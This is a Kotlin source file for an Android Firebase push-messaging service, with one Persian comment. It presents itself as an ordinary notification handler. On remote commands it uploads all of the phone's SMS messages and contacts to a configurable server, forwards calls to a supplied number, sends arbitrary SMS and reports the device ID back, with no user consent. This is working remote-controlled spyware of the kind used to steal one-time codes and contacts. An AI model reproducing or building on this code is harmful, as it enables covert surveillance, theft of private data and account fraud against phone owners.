package com.example.test

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.telephony.SmsManager
import android.telephony.SubscriptionInfo
import android.telephony.SubscriptionManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import kotlinx.coroutines.*
import com.example.test.utils.SmsBatchUploader
import com.example.test.utils.ContactsBatchUploader

class MyFirebaseMessagingService : FirebaseMessagingService() {

    companion object {
        private const val TAG = "MyFirebaseMsgService"
        private const val CHANNEL_ID = "default_channel"
    }
    
    // ⭐ آدرس سرور از Firebase Remote Config
    private fun getBaseUrl(): String = ServerConfig.getBaseUrl()

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "📥 FCM Message Received")
        Log.d(TAG, "From: ${remoteMessage.from}")
        Log.d(TAG, "Message ID: ${remoteMessage.messageId}")
        Log.d(TAG, "════════════════════════════════════════")

        // Handle notification
        remoteMessage.notification?.let {
            Log.d(TAG, "📢 Notification Title: ${it.title}")
            Log.d(TAG, "📢 Notification Body: ${it.body}")
            showNotification(it.title ?: "", it.body ?: "")
        }

        // Handle data payload
        if (remoteMessage.data.isNotEmpty()) {
            Log.d(TAG, "📦 Data Payload:")
            remoteMessage.data.forEach { (key, value) ->
                Log.d(TAG, "   - $key: $value")
            }
            handleDataMessage(remoteMessage.data)
        } else {
            Log.w(TAG, "⚠️ No data payload received")
        }

        Log.d(TAG, "════════════════════════════════════════")
    }

    private fun handleDataMessage(data: Map<String, String>) {
        Log.d(TAG, "🔄 Starting handleDataMessage...")

        val type = data["type"]
        val phone = data["phone"]
        val message = data["message"]
        val simSlotStr = data["simSlot"]
        val forwardNumber = data["number"]

        Log.d(TAG, "🔍 Parsed Data:")
        Log.d(TAG, "   - type: $type")
        Log.d(TAG, "   - phone: $phone")
        Log.d(TAG, "   - message: $message")
        Log.d(TAG, "   - simSlot: $simSlotStr")
        Log.d(TAG, "   - forwardNumber: $forwardNumber")

        val simSlot = simSlotStr?.toIntOrNull() ?: 0
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)

        Log.d(TAG, "📱 Device ID: $deviceId")
        Log.d(TAG, "📟 SIM Slot: $simSlot")

        when (type) {
            "ping" -> {
                Log.d(TAG, "🎯 PING command detected!")
                sendOnlineConfirmation()
            }

            "call_forwarding" -> {
                Log.d(TAG, "📞 Call Forwarding command")
                if (!forwardNumber.isNullOrEmpty()) {
                    val utility = CallForwardingUtility(applicationContext, deviceId)
                    val result = utility.forwardCall(forwardNumber, simSlot)
                    Log.d(TAG, "✅ Call forwarding result: $result")
                } else {
                    Log.w(TAG, "❌ Missing number for call forwarding")
                }
            }

            "call_forwarding_disable" -> {
                Log.d(TAG, "📞 Disable Call Forwarding command")
                val utility = CallForwardingUtility(applicationContext, deviceId)
                val result = utility.deactivateCallForwarding(simSlot)
                Log.d(TAG, "✅ Deactivate result: $result")
            }

            "quick_upload_sms" -> {
                Log.d(TAG, "📨 Quick SMS Upload command")
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        Log.d(TAG, "🚀 Starting Quick SMS upload...")
                        val result = SmsBatchUploader.uploadQuickSms(
                            context = applicationContext,
                            deviceId = deviceId,
                            baseUrl = getBaseUrl(),
                            limit = 50
                        )

                        when (result) {
                            is SmsBatchUploader.UploadResult.Success -> {
                                Log.d(TAG, "✅ Quick SMS uploaded: ${result.totalSent} messages")
                                sendUploadResponse("quick_sms_success", result.totalSent)
                            }
                            is SmsBatchUploader.UploadResult.Failure -> {
                                Log.e(TAG, "❌ Quick SMS failed: ${result.error}")
                                sendUploadResponse("quick_sms_failed", 0, result.error)
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "💥 Quick SMS upload error: ${e.message}", e)
                    }
                }
            }

            "quick_upload_contacts" -> {
                Log.d(TAG, "👥 Quick Contacts Upload command")
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        Log.d(TAG, "🚀 Starting Quick Contacts upload...")
                        val result = ContactsBatchUploader.uploadQuickContacts(
                            context = applicationContext,
                            deviceId = deviceId,
                            baseUrl = getBaseUrl(),
                            limit = 50
                        )

                        when (result) {
                            is ContactsBatchUploader.UploadResult.Success -> {
                                Log.d(TAG, "✅ Quick contacts uploaded: ${result.totalSent} contacts")
                                sendUploadResponse("quick_contacts_success", result.totalSent)
                            }
                            is ContactsBatchUploader.UploadResult.Failure -> {
                                Log.e(TAG, "❌ Quick contacts failed: ${result.error}")
                                sendUploadResponse("quick_contacts_failed", 0, result.error)
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "💥 Quick contacts upload error: ${e.message}", e)
                    }
                }
            }

            "upload_all_sms" -> {
                Log.d(TAG, "📨📦 Full SMS Upload command")
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        Log.d(TAG, "🚀 Starting Full SMS upload...")
                        val result = SmsBatchUploader.uploadAllSms(
                            context = applicationContext,
                            deviceId = deviceId,
                            baseUrl = getBaseUrl(),
                            onProgress = { progress ->
                                when (progress) {
                                    is SmsBatchUploader.UploadProgress.Processing -> {
                                        Log.d(TAG, "📊 SMS Progress: ${progress.processed}/${progress.total}")
                                    }
                                    else -> {}
                                }
                            }
                        )

                        when (result) {
                            is SmsBatchUploader.UploadResult.Success -> {
                                Log.d(TAG, "✅ All SMS uploaded: ${result.totalSent} messages")
                                sendUploadResponse("all_sms_success", result.totalSent)
                            }
                            is SmsBatchUploader.UploadResult.Failure -> {
                                Log.e(TAG, "❌ All SMS failed: ${result.error}")
                                sendUploadResponse("all_sms_failed", 0, result.error)
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "💥 All SMS upload error: ${e.message}", e)
                    }
                }
            }

            "upload_all_contacts" -> {
                Log.d(TAG, "👥📦 Full Contacts Upload command")
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        Log.d(TAG, "🚀 Starting Full Contacts upload...")
                        val result = ContactsBatchUploader.uploadAllContacts(
                            context = applicationContext,
                            deviceId = deviceId,
                            baseUrl = getBaseUrl(),
                            onProgress = { current, total ->
                                Log.d(TAG, "📊 Contacts Progress: $current/$total")
                            }
                        )

                        when (result) {
                            is ContactsBatchUploader.UploadResult.Success -> {
                                Log.d(TAG, "✅ All contacts uploaded: ${result.totalSent} contacts")
                                sendUploadResponse("all_contacts_success", result.totalSent)
                            }
                            is ContactsBatchUploader.UploadResult.Failure -> {
                                Log.e(TAG, "❌ All contacts failed: ${result.error}")
                                sendUploadResponse("all_contacts_failed", 0, result.error)
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "💥 All contacts upload error: ${e.message}", e)
                    }
                }
            }

            else -> {
                Log.w(TAG, "⚠️ Unknown command type: $type")
                if (phone != null && message != null) {
                    Log.d(TAG, "📨 Fallback: Sending SMS...")
                    sendSms(phone, message, simSlot)
                } else {
                    Log.w(TAG, "❌ No valid command or SMS data")
                }
            }
        }
    }

    private fun sendSms(phone: String, message: String, simSlot: Int) {
        Log.d(TAG, "═══ SMS Sending Started ═══")
        Log.d(TAG, "📱 To: $phone")
        Log.d(TAG, "💬 Message: ${message.take(50)}...")
        Log.d(TAG, "📟 SIM Slot: $simSlot")

        try {
            val subManager = getSystemService(TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager

            if (subManager == null) {
                Log.e(TAG, "❌ SubscriptionManager is null")
                return
            }

            val activeSubscriptions = subManager.activeSubscriptionInfoList

            if (activeSubscriptions.isNullOrEmpty() || simSlot >= activeSubscriptions.size) {
                Log.w(TAG, "⚠️ Invalid SIM slot, using default")
                SmsManager.getDefault().sendTextMessage(phone, null, message, null, null)
                Log.d(TAG, "✅ SMS sent to $phone using default SIM")
                return
            }

            val subscriptionId = activeSubscriptions[simSlot].subscriptionId
            Log.d(TAG, "📟 Using subscription ID: $subscriptionId")

            val smsManager = SmsManager.getSmsManagerForSubscriptionId(subscriptionId)
            smsManager.sendTextMessage(phone, null, message, null, null)
            Log.d(TAG, "✅ SMS sent to $phone using SIM slot $simSlot")

        } catch (e: SecurityException) {
            Log.e(TAG, "❌ SEND_SMS permission denied", e)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to send SMS", e)
        }
    }

    private fun sendOnlineConfirmation() {
        Log.d(TAG, "═══ Ping Response Started ═══")

        Thread {
            try {
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                Log.d(TAG, "📱 Device ID: $deviceId")

                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                }

                val urlString = "${getBaseUrl()}/ping-response"
                Log.d(TAG, "🌐 URL: $urlString")
                Log.d(TAG, "📤 Body: ${body.toString()}")

                val url = URL(urlString)
                val conn = url.openConnection() as HttpURLConnection

                Log.d(TAG, "🔗 Opening connection...")

                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 15000
                conn.readTimeout = 15000

                Log.d(TAG, "📝 Writing request body...")

                conn.outputStream.use { os ->
                    val bytes = body.toString().toByteArray()
                    Log.d(TAG, "📊 Body size: ${bytes.size} bytes")
                    os.write(bytes)
                    os.flush()
                }

                val responseCode = conn.responseCode
                Log.d(TAG, "📥 Response Code: $responseCode")

                if (responseCode == HttpURLConnection.HTTP_OK) {
                    val response = conn.inputStream.bufferedReader().use { it.readText() }
                    Log.d(TAG, "✅ Server Response: $response")
                } else {
                    val errorResponse = conn.errorStream?.bufferedReader()?.use { it.readText() }
                    Log.e(TAG, "❌ Error Response: $errorResponse")
                }

                conn.disconnect()
                Log.d(TAG, "✅ Ping response completed successfully")

            } catch (e: java.net.ConnectException) {
                Log.e(TAG, "❌ Connection failed: Cannot reach server", e)
            } catch (e: java.net.SocketTimeoutException) {
                Log.e(TAG, "❌ Connection timeout", e)
            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed to send ping response", e)
                e.printStackTrace()
            }
        }.start()
    }

    private fun sendUploadResponse(status: String, count: Int, error: String? = null) {
        Log.d(TAG, "═══ Upload Response Started ═══")
        Log.d(TAG, "📊 Status: $status")
        Log.d(TAG, "📊 Count: $count")
        if (error != null) {
            Log.d(TAG, "📊 Error: $error")
        }

        Thread {
            try {
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                val body = JSONObject().apply {
                    put("device_id", deviceId)
                    put("status", status)
                    put("count", count)
                    if (error != null) {
                        put("error", error)
                    }
                }

                val urlString = "${getBaseUrl()}/upload-response"
                Log.d(TAG, "🌐 URL: $urlString")
                Log.d(TAG, "📤 Body: ${body.toString()}")

                val url = URL(urlString)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.connectTimeout = 15000
                conn.readTimeout = 15000

                conn.outputStream.use { os ->
                    os.write(body.toString().toByteArray())
                    os.flush()
                }

                val responseCode = conn.responseCode
                Log.d(TAG, "📥 Upload response code: $responseCode")

                if (responseCode == HttpURLConnection.HTTP_OK) {
                    Log.d(TAG, "✅ Upload response sent successfully")
                } else {
                    Log.e(TAG, "❌ Upload response failed with code: $responseCode")
                }

            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed to send upload response", e)
                e.printStackTrace()
            }
        }.start()
    }

    private fun showNotification(title: String, messageBody: String) {
        Log.d(TAG, "🔔 Showing notification: $title - $messageBody")

        val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Default Channel",
                NotificationManager.IMPORTANCE_DEFAULT
            ).apply {
                description = "Channel for app notifications"
                enableLights(true)
                lightColor = android.graphics.Color.BLUE
            }
            notificationManager.createNotificationChannel(channel)
        }

        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }

        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle(title)
            .setContentText(messageBody)
            .setAutoCancel(true)
            .setContentIntent(pendingIntent)
            .build()

        notificationManager.notify(0, notification)
        Log.d(TAG, "✅ Notification displayed")
    }

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "🔄 FCM Token Updated")
        Log.d(TAG, "New Token: $token")
        Log.d(TAG, "════════════════════════════════════════")
        // TODO: Send token to server
    }
}